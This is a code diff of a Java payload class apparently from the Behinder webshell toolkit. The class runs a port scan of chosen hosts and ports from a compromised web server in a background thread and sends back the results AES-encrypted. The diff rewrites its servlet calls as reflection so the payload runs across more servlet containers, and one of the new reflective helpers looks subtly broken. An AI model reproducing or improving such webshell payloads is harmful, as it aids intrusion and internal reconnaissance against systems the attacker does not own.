@@ -1,28 +1,26 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.net.Socket;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
 
 public class Scan implements Runnable {
    public static String ipList;
    public static String portList;
    public static String taskID;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
-   public Scan(HttpSession session) {
+   public Scan(Object session) {
       this.Session = session;
    }
 
@@ -36,54 +34,58 @@ public class Scan implements Runnable {
       this.Request = page.getRequest();
       page.getResponse().setCharacterEncoding("UTF-8");
       HashMap result = new HashMap();
-      boolean var12 = false;
+      boolean var14 = false;
 
-      ServletOutputStream so = null;
+      Object so;
+      Method write;
       label77: {
          try {
-            var12 = true;
+            var14 = true;
             (new Thread(new Scan(this.Session))).start();
             result.put("msg", "扫描任务提交成功");
             result.put("status", "success");
-            var12 = false;
+            var14 = false;
             break label77;
-         } catch (Exception var16) {
-            result.put("msg", var16.getMessage());
+         } catch (Exception var18) {
+            result.put("msg", var18.getMessage());
             result.put("status", "fail");
-            var12 = false;
+            var14 = false;
          } finally {
-            if (var12) {
+            if (var14) {
                try {
-                  so = this.Response.getOutputStream();
-                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.flush();
-                  so.close();
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
                   page.getOut().clear();
-               } catch (Exception var13) {
+               } catch (Exception var15) {
                }
 
             }
          }
 
          try {
-            so = this.Response.getOutputStream();
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
             page.getOut().clear();
-         } catch (Exception var14) {
+         } catch (Exception var16) {
          }
 
          return true;
       }
 
       try {
-         so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
          page.getOut().clear();
-      } catch (Exception var15) {
+      } catch (Exception var17) {
       }
 
       return true;
@@ -117,7 +119,7 @@ public class Scan implements Runnable {
                }
 
                sessionObj.put("result", this.buildJson(scanResult, false));
-               this.Session.setAttribute(taskID, sessionObj);
+               this.sessionSetAttribute(this.Session, taskID, sessionObj);
             }
          }
 
@@ -128,7 +130,7 @@ public class Scan implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -192,5 +194,58 @@ public class Scan implements Runnable {
 
       sb.append("]");
       return sb.toString();
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
+      }
+
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   private Enumeration sessionGetAttributeNames(Object session) {
+      Enumeration result = null;
+
+      try {
+         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+      } catch (Exception var4) {
+      }
+
+      return result;
+   }
+
+   private void sessionRemoveAttribute(Object session, String key) {
+      try {
+         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+      } catch (Exception var4) {
+      }
+
    }
 }
